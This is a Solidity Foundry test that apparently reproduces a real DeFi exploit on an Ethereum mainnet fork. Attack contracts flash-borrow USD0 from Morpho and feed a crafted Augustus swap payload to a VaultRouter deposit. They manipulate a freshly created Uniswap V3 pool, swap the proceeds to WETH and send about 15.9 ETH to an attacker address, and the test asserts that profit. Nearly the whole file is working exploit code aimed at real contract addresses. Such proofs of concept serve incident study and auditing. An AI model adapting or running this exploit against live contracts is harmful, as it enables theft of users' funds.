
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 22575929;
    uint256 constant TX_TIMESTAMP = 1748370719;
    uint256 constant TX_BLOCK_NUMBER = 22575930;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _installAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installAttack() internal returns (OurAttack attack) {
        _etchAttackRuntime();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), Addresses.attack_child);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attacker_eoa, Addresses.attacker_eoa, Addresses.ZERO, "ETH", 15887105773747314980
        );
        _expectProfit(Addresses.attack_child, attackChild, Addresses.usUSDS, "usUSDS++", 5);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.UNI_V3_POS, "UNI-V3-POS", 1);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _bindChildAddr();
    }

    function _bindChildAddr() internal {

        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0xfb45BcD7239774cdBC5018fD47faF1a2fc219D1F));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindChildAddr();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _bindChildAddr();
        _startFlashLoan();
    }

    function _startFlashLoan() public {
        _readAttackSusds();
        _fundChildAndBorrow();
    }

    function _readAttackSusds() internal view {
        IERC20Like(Addresses.sUSDS_7FBD).balanceOf(address(this));
    }

    function _fundChildAndBorrow() internal {
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        AttackChild(payable(address(attackChild))).acceptChildDeploy();
        uint256 childSeedAmount = 10;
        IERC20Like(Addresses.sUSDS_7FBD).transfer(address(attackChild), childSeedAmount);
        AttackChild(payable(address(attackChild))).setupPositionAndBorrow();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0xfb45BcD7239774cdBC5018fD47faF1a2fc219D1F));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    bytes4 constant AUGUSTUS_DIRECT_UNI_V3_SWAP_SELECTOR = 0xa6886da9;

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackPayload) external payable {
        amount;
        callbackPayload;
        if (!replayedCallback2) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x565ad466) {
            _setupPosAndBorrow();
            return;
        }
        _entryCb();
    }

    function flashCallback() external payable {
        if (!replayedCallback1) flashCallback2();
        return;
    }

    function setupPositionAndBorrow() external payable {
        _setupPosAndBorrow();
        return;
    }

    function _entryCb() internal {}

    bool private replayedCallback1;
    bool private replayedCallback2;

    function flashCallback2() internal {
        replayedCallback2 = true;
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USD0).approve(Addresses.VaultRouter, 1899838465685386939269479);
    }

    function flashCallback4() internal {
        bytes memory depositProof = abi.encodeWithSelector(
            AUGUSTUS_DIRECT_UNI_V3_SWAP_SELECTOR,
            DirectUniV3({
                fromToken: Addresses.USD0_ACF5,
                toToken: Addresses.sUSDS_7FBD,
                exchange: Addresses.SwapRouter,
                fromAmount: uint256(1899838465685386939269479),
                toAmount: uint256(1),
                expectedAmount: uint256(1),
                feePercent: uint256(0),
                deadline: uint256(1748370729),
                partner: payable(Addresses.VaultRouter),
                isApproved: false,
                beneficiary: payable(Addresses.VaultRouter),
                path: abi.encodePacked(Addresses.USD0_ACF5, uint24(500), Addresses.sUSDS_7FBD),
                permit: hex"",
                uuid: bytes16(hex"d3ba174c721349ff915ec624c071422a")
            })
        );
        IVaultRouter(Addresses.VaultRouter)
            .deposit(
                Addresses.AugustusSwapper,
                Addresses.USD0,
                1899838465685386939269479,
                1,
                0,
                address(this),
                depositProof
            );
        IUNI_V3_POS(Addresses.UNI_V3_POS).positions(998318);
    }

    function flashCallback5() internal {
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .decreaseLiquidity(
                DecreaseLiquidityParams({
                    tokenId: 998318, liquidity: 8720452440564722, amount0Min: 0, amount1Min: 0, deadline: 1748370719
                })
            );
    }

    function flashCallback6() internal {
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .collect(
                CollectParams({
                    tokenId: 998318,
                    recipient: address(this),
                    amount0Max: type(uint128).max,
                    amount1Max: type(uint128).max
                })
            );
        IERC20Like(Addresses.USD0_ACF5).balanceOf(address(this));
    }

    function flashCallback7() internal {
        uint256 usd0SwapAllowance = 1899838465685386939269477;
        IERC20Like(Addresses.USD0_ACF5).approve(Addresses.USD0USD0, usd0SwapAllowance);
    }

    function flashCallback8() internal {
        uint256 usd0usd0ExchangeAmount = 1899838465685386939269477;
        IUSD0USD0(Addresses.USD0USD0).exchange(int128(0), int128(1), usd0usd0ExchangeAmount, 0, address(this));
        IERC20Like(Addresses.USD0).balanceOf(address(this));
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.USD0).balanceOf(address(this));
        uint256 morphoRepayAllowance = 1899838465685386939269479;
        IERC20Like(Addresses.USD0).approve(Addresses.Morpho, morphoRepayAllowance);
    }

    function flashCallback10() internal {
        uint256 curveSwapAllowance = 43847725777335611631336;
        IERC20Like(Addresses.USD0).approve(Addresses.USD0USD0, curveSwapAllowance);
    }

    function flashCallback11() internal {
        IUSD0USD0(Addresses.USD0USD0).exchange(int128(1), int128(0), 43847725777335611631336, 0, address(this));
        IERC20Like(Addresses.USD0_ACF5).balanceOf(address(this));
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 routerSwapAllowance = 42973674683230843641696;
        IERC20Like(Addresses.USD0_ACF5).approve(Addresses.SwapRouter, routerSwapAllowance);
    }

    function flashCallback13() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactInput(
                ExactInputParams({
                    path: abi.encodePacked(
                        Addresses.USD0_ACF5, uint24(100), Addresses.USDC, uint24(500), Addresses.WETH
                    ),
                    recipient: address(this),
                    deadline: 1748370719,
                    amountIn: 42973674683230843641696,
                    amountOutMinimum: 0
                })
            );
    }

    function _setupPosAndBorrow() internal {


        _approvePositionMgmt();
        _initUniV3Pool();
        _mintUniV3Position();
        _borrowUsd0();
        _readWethBalance();
        _unwrapAndProfit();
    }

    function _approvePositionMgmt() internal {
        IUSD0(Addresses.USD0).getUnwrapCap(Addresses.VaultRouter);
        IERC20Like(Addresses.sUSDS_7FBD).approve(Addresses.UNI_V3_POS, 10);
    }

    function _initUniV3Pool() internal {
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .createAndInitializePoolIfNecessary(
                Addresses.USD0_ACF5, Addresses.sUSDS_7FBD, uint24(500), uint160(181769597477799861)
            );
    }

    function _mintUniV3Position() internal {
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .mint(
                MintParams({
                    token0: Addresses.USD0_ACF5,
                    token1: Addresses.sUSDS_7FBD,
                    fee: 500,
                    tickLower: -536050,
                    tickUpper: -536040,
                    amount0Desired: 0,
                    amount1Desired: 10,
                    amount0Min: 0,
                    amount1Min: 0,
                    recipient: address(this),
                    deadline: 1748370729
                })
            );
    }

    function _borrowUsd0() internal {
        bytes memory callbackPayload = abi.encode(
            Addresses.AugustusSwapper,
            0x00000000000000000000000000000000000001F4,
            uint256(1310620586257487374012534461768647161943012283748),
            uint256(917551056842671309452305380979543736893630245704),
            uint256(1097077688018008265106216665536940668749033598146)
        );
        IMorpho(Addresses.Morpho).flashLoan(Addresses.USD0, 1899838465685386939269479, callbackPayload);
    }

    function _readWethBalance() internal view {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _unwrapAndProfit() internal {
        uint256 wethProfitAmount = 15925452345403740016;
        IWETH(Addresses.WETH).withdraw(wethProfitAmount);
        if (address(this).balance > 0) {
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: address(this).balance}("");
            require(ok, "profit transfer failed");
        }
    }

    function acceptChildDeploy() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USD0USD0 = 0x1d08E7adC263CfC70b1BaBe6dC5Bb339c16Eec52;
    address internal constant UniswapV3Factory = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant TokenTransferProxy = 0x216B4B4Ba9F3e719726886d34a177484278Bfcae;
    address internal constant attacker_eoa = 0x2ae2F691642bb18Cd8deB13a378A0f95A9FEe933;
    address internal constant USD0 = 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant UniswapV3Pool = 0x4e665157291DBcb25152ebB01061E4012F58aDd2;
    address internal constant sUSDS = 0x4e7991e5C547ce825BdEb665EE14a3274f9F61e0;
    address internal constant usUSDS = 0x67ec31a47a4126A66C7bb2fE017308cf5832A4Db;
    address internal constant USD0_ACF5 = 0x73A15FeD60Bf67631dC6cd7Bc5B6e8da8190aCF5;
    address internal constant UniswapV3Pool_5640 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant sUSDS_7FBD = 0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD;
    address internal constant Usd0 = 0xAe12F6F805842e6Dafe71a6d2b41B28BA5fC821e;
    address internal constant UniswapV3Pool_3D68 = 0xB4f2210c6641F7D018bd314fECC96f7758be3D68;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNI_V3_POS = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant AugustusSwapper = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;
    address internal constant Usd0PP = 0xe025d17562A62159E6731298c5A51ad444529354;
    address internal constant VaultRouter = 0xE033cb1bB400C0983fA60ce62f8eCDF6A16fcE09;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant FeeClaimer = 0xeF13101C5bbD737cFb2bF00Bbd38c626AD6952F7;
    address internal constant attack_contract = 0xf195b8800B729aEe5E57851dD4330fCBB69F07EA;
    address internal constant attack_child = 0xfb45BcD7239774cdBC5018fD47faF1a2fc219D1F;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct DecreaseLiquidityParams {
    uint256 tokenId;
    uint128 liquidity;
    uint256 amount0Min;
    uint256 amount1Min;
    uint256 deadline;
}

struct CollectParams {
    uint256 tokenId;
    address recipient;
    uint128 amount0Max;
    uint128 amount1Max;
}

struct ExactInputParams {
    bytes path;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
}

struct MintParams {
    address token0;
    address token1;
    uint24 fee;
    int24 tickLower;
    int24 tickUpper;
    uint256 amount0Desired;
    uint256 amount1Desired;
    uint256 amount0Min;
    uint256 amount1Min;
    address recipient;
    uint256 deadline;
}

struct DirectUniV3 {
    address fromToken;
    address toToken;
    address exchange;
    uint256 fromAmount;
    uint256 toAmount;
    uint256 expectedAmount;
    uint256 feePercent;
    uint256 deadline;
    address payable partner;
    bool isApproved;
    address payable beneficiary;
    bytes path;
    bytes permit;
    bytes16 uuid;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ISwapRouter {
    function exactInput(ExactInputParams calldata) external returns (uint256);
}

interface IUNI_V3_POS {
    function collect(CollectParams calldata) external;
    function createAndInitializePoolIfNecessary(address, address, uint24, uint160) external returns (uint256);
    function decreaseLiquidity(DecreaseLiquidityParams calldata) external;
    function mint(MintParams calldata) external;
    function positions(uint256) external view;
}

interface IUSD0 {
    function getUnwrapCap(address) external view returns (uint256);
}

interface IUSD0USD0 {
    function exchange(int128, int128, uint256, uint256, address) external returns (uint256);
}

interface IVaultRouter {
    function deposit(address, address, uint256, uint256, uint256, address, bytes calldata) external returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;
}
